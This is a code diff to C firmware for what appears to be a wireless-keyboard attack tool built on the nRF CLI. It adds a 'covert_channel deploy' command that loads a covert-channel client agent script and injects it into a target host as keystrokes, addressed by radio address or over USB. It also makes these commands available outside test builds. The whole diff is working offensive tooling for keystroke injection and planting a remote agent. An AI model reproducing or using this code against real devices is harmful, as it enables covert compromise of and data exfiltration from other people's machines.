@@ -1279,7 +1279,6 @@ static void cmd_enum_active(nrf_cli_t const * p_cli, size_t argc, char **argv) {
     }
 }
 
-#ifdef CLI_TEST_COMMANDS
 
 #define MAX_CC_PAY_SIZE 16
 bool pre_cmd_callback_covert_channel(nrf_cli_t const * p_cli, char const * const p_cmd_buf) {
@@ -1333,7 +1332,7 @@ bool pre_cmd_callback_covert_channel(nrf_cli_t const * p_cli, char const * const
 }
 
 
-static void cmd_covert_channel(nrf_cli_t const * p_cli, size_t argc, char **argv) {
+static void cmd_covert_channel_run(nrf_cli_t const *p_cli, size_t argc, char **argv) {
     if (argc > 1)
     {
 
@@ -1360,7 +1359,43 @@ static void cmd_covert_channel(nrf_cli_t const * p_cli, size_t argc, char **argv
     }
 }
 
-#endif
+static void cmd_covert_channel_deploy(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    // deploy covert channel agent
+    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "load covert channel client agent script\r\n");
+    deploy_covert_channel_script(false);
+
+    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "inject covert channel client agent into target %s\r\n", argv[1]);
+
+    if (argc > 1)
+    {
+        //nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);
+
+        //parse arg 1 as address
+        uint8_t addr[5];
+        if (strcmp(argv[1], "USB") == 0) {
+            memset(addr,0x00,5);
+            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes to USB keyboard interface\r\n");
+        } else {
+            if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
+                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
+                return;
+            }
+
+            char tmp_addr_str[16];
+            helper_addr_to_hex_str(tmp_addr_str, 5, addr);
+            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
+        }
+
+        //logitacker_keyboard_map_test();
+        logitacker_enter_mode_injection(addr);
+        logitacker_injection_start_execution(true);
+        return;
+    } else {
+        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "device address needed, format has to be xx:xx:xx:xx:xx\r\n");
+        return;
+    }
+}
+
 
 #ifdef CLI_TEST_COMMANDS
 NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_test)
@@ -1469,9 +1504,16 @@ NRF_CLI_CMD_REGISTER(devices, &m_sub_devices, "List discovered devices", cmd_dev
 
 NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_enum_device_list, dynamic_device_addr_list_ram);
 
-#ifdef CLI_TEST_COMMANDS
-NRF_CLI_CMD_REGISTER(covert_channel, &m_sub_enum_device_list, "start covert channel for given device", cmd_covert_channel);
-#endif
+NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_covertchannel)
+{
+        NRF_CLI_CMD(run, &m_sub_enum_device_list, "start covert channel for given device", cmd_covert_channel_run),
+        NRF_CLI_CMD(deploy, &m_sub_enum_device_list, "start covert channel for given device", cmd_covert_channel_deploy),
+        NRF_CLI_SUBCMD_SET_END
+};
+
+NRF_CLI_CMD_REGISTER(covert_channel, &m_sub_covertchannel, "start covert channel for given device", NULL);
+
+
 NRF_CLI_CMD_REGISTER(active_enum, &m_sub_enum_device_list, "start active enumeration of given device", cmd_enum_active);
 NRF_CLI_CMD_REGISTER(passive_enum, &m_sub_enum_device_list, "start passive enumeration of given device", cmd_enum_passive);
 
